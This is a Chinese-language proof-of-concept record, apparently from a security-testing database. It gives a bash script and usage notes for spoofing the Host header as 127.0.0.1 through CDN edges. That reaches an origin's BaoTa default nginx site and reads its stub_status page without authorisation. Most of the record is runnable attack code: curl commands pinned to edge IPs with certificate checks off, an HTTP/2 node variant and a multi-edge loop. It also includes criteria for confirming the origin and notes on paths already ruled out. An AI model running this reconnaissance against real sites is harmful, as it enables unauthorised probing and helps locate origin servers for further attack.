# 边缘 Host 头改为 127.0.0.1 回源到宝塔默认站点 → 未授权读取 nginx stub_status（/nginx_status）与 50x.html

- **code**: edge-host-127.0.0.1-baota-default-site-nginx-stub-status-una
- **kind**: poc
- **category**: info-leak
- **component**: nginx stub_status (http_stub_status_module) / 宝塔默认站点 / CDN 边缘 Host 路由
- **severity**: low
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-02 13:44-13:47 (+08) 在 https://target485.example.com 实测（Windows curl.exe，--resolve 固定边缘、SNI/URL 保持 www 域名、仅改 Host: 127.0.0.1）：GET /nginx_status → HTTP/1.1 200、Content-Type: text/plain、116B，正文 "Active connections: 64 / server accepts handled requests / 304351 304351 2402612 / Reading: 0 Writing: 27 Waiting: 37"；同一 URL 用 Host: target485.example.com 只回 200 + 798B text/html（Sub2API SPA index），证明差异由 Host 造成。GET /50x.html（Host: 127.0.0.1）→ 200/497B nginx 默认 Error 页，印证默认站 docroot 为 nginx 自带 html 目录。在边缘 192.0.2.6/112/121/126/133/136 共 6 台上全部复现，且各边缘回显的 accepts 计数连续递增（同一计数器）⇒ 判定为同一源站、边缘纯按 Host 回源。此前 2026-11-01 在边缘 192.0.2.5 已有同结论（107B，accepts 2900），本条为跨边缘加固证据。
- **path**: pocs/edge-host-127.0.0.1-baota-default-site-nginx-stub-status-una/poc.sh
- **tags**: nginx, stub-status, host-header, 127.0.0.1, 宝塔, default_server, cdn回源, 信息泄露, 未授权, recon, h2-authority, peekabo, 多边缘复测
- **created_at**: 2026-11-01T08:13:15.811Z
- **engine**: https://target485.example.com（Peekabo/Photon-Edge 边缘 192.0.2.6/112/121/126/133/136）

## 描述

CDN/边缘按 Host 头回源且源站 nginx 配了 default_server（宝塔默认站点）时，把 Host 头（或 h2 :authority）改成 127.0.0.1 就能绕过主站 vhost、直落默认站点，其上独立注册的 /nginx_status 无鉴权返回连接/请求计数。前提是 SNI 与 URL 主机名保持真实域名（证书校验与边缘 TLS 路由都靠它），只有 Host 可改。泄露量小（低危），但可作为确认「源站直连可行、源站是宝塔、还有其他 vhost 待枚举」的稳定信道。

## 用法

```
用法：把 EDGE 换成目标边缘 IP（或直接不改，用 --resolve 指向已知边缘），HOST 保持真实站点域名，VHOST 换成要伪造的 Host。
  bash stub_status_host_127_0_0_1.sh
判据（三条必须同时成立才算数）：
  1) Host: 127.0.0.1 的 GET / 返回非主站内容（宝塔「没有找到站点」默认页，Content-Length 约 1.3KB）；
  2) Host: 127.0.0.1 的 GET /nginx_status 返回 200 + text/plain + "Active connections: N"；
  3) 同 URL 换回 Host: 真实域名，/nginx_status 返回 text/html 的 SPA index（对照）。
旁证（可选但很强）：换多台边缘 IP 重复 1-2，若各边缘的 accepts/handled/requests 计数连续递增，说明打到的是同一计数器 = 同一源站，边缘纯按 Host 回源。
失败常见原因：
  - 边缘只按 SNI 分流不看 Host → 两个 Host 结果完全一样（那就没这条）；
  - 源站没开 default_server 或没注册 stub_status → 走 / 会落到主站或 404；
  - 目标不在 CDN 后面、直达源站 → Host 改不改都能看到同一站点，只能算「直接暴露」；
  - 本地 HTTP 代理会二次按 Host 分流 → 结论必须用 --noproxy "*" 或无代理链路复核。
注意：默认站通常只允许 GET/HEAD（其它方法 405），无 PHP 文件、无 DAV 写面，因此这条一般不通向 RCE，用途是侦察与源站定位；h2 用 :authority 等价，ALPN 走 h2 时同样成立。
```

## 正文

```
#!/usr/bin/env bash
# 边缘 Host 头路由绕过 → 源站宝塔默认站点 → 未授权 nginx stub_status
# 前置：URL 与 SNI 保持真实域名，只有 Host 头(:authority)被改成 127.0.0.1
# 全程低频（<=3 req/s），每个变体都留正常对照

HOST="target485.example.com"          # 用于 --resolve 与 SNI 的真实主机名
EDGE="192.0.2.5"             # 已知边缘 IP；未知时可省略 --resolve 走 DNS
BASE="https://${HOST}"
RES="--resolve ${HOST}:443:${EDGE}"
CURL="curl -sS -k --noproxy * ${RES}"

echo "=== [0] 基线：正常 Host，主站 SPA ==="
$CURL -o /dev/null -D - "${BASE}/nginx_status" | head -5
# 期望：200 + Content-Type: text/html ... + 约 3.3KB 的 SPA index

echo "=== [1] 伪造 Host: 127.0.0.1，暴露宝塔默认站点 ==="
$CURL -H "Host: 127.0.0.1" -D - "${BASE}/" | head -8
# 期望：200 + Content-Length 约 1326 + <title>没有找到站点</title>
#       响应头 ETag 形如 W/"59005463-52e"、Last-Modified 为 2017 年 → 宝塔默认页

echo "=== [2] 默认站上的 stub_status（核心payload）==="
$CURL -H "Host: 127.0.0.1" -D - "${BASE}/nginx_status"
# 期望：200 + Content-Type: text/plain
#       Active connections: N
#        server accepts handled requests
#        <accepts> <handled> <requests>
#        Reading: X Writing: Y Waiting: Z

echo "=== [3] 印证 docroot 是宝塔默认 html 目录 ==="
$CURL -H "Host: 127.0.0.1" -D - "${BASE}/50x.html" | head -5
# 期望：200 + 约 497B + <title>Error</title>（nginx 自带 50x 页）

# ---- 变体矩阵（端口可任意；h2 用 :authority 等价，SNI 仍为真实域名）----
# for p in 80 443 8888; do curl -sS -k --noproxy '*' -H "Host: 127.0.0.1" "https://${HOST}:${p}/nginx_status"; done

# HTTP/2 复核（node，ALPN=h2）：
# const http2=require('http2'),tls=require('tls');
# const c=http2.connect('https://'+HOST+':443',{createConnection:()=>tls.connect({host:EDGE,servername:HOST,ALPNProtocols:['h2'],rejectUnauthorized:false})});
# c.on('response',h=>console.log(h[':status'],h['content-type']));
# const r=c.request({':authority':'127.0.0.1',':path':'/nginx_status',':method':'GET'}); r.end();

# ---- 2026-11-02 多边缘复测（task#612，加固「边缘纯按 Host 回源」这一判定）----
# for ip in 192.0.2.6 192.0.2.7 192.0.2.8 192.0.2.5 192.0.2.9 192.0.2.10; do
#   echo "--- $ip"; curl -sS -k --noproxy '*' --resolve ${HOST}:443:${ip} \
#     -H "Host: 127.0.0.1" "https://${HOST}/nginx_status"
# done
# 判定：6/6 均 200 + text/plain，且 accepts/handled/requests 三个计数在边缘之间单调递增
#       （示例：304351 304351 2402612）→ 同一源站同一计数器，边缘不缓存、只按 Host 回源。
# 对照：同 URL 用 Host: ${HOST} → 200 + text/html 798B（Sub2API SPA index），确认路径本身存在只是被 vhost 吞掉。

# ---- 已证否 / 边界（省下一轮额度）----
# - 默认站无 PHP 文件：/phpinfo.php、/index.php 均 nginx 404
# - 无 DAV/PUT：非 GET/HEAD 一律 405
# - /._user.ini、/404 等其余路径均为 nginx 404，无面板页
# - 仅 GET /HEAD 有输出；别指望从这条直通代码执行

exit 0

```
